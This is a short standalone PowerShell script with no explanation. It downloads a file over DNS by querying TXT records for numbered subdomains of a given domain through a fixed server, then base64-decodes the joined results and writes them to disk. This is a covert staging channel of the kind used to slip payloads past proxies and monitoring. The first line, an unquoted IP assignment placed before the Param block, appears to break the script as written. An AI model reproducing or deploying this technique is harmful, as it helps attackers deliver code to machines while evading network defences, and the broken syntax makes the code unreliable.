$Server = 10.1.1.1
Param([String]$s)$error.clear();$p="";for($i=0;$i -ge 0;$i++){$c=[string](Invoke-Expression "cmd.exe /C nslookup -type=TXT $($i).$($s) $Server");if($error.Count -ge 1){$i=-10;}$f=$c.IndexOf('"')+1;$l=$c.LastIndexOf('"')-$f;$p+=$c.Substring($f,$l);}$o=[Convert]::FromBase64String($p);[IO.File]::WriteAllBytes('output',$o)
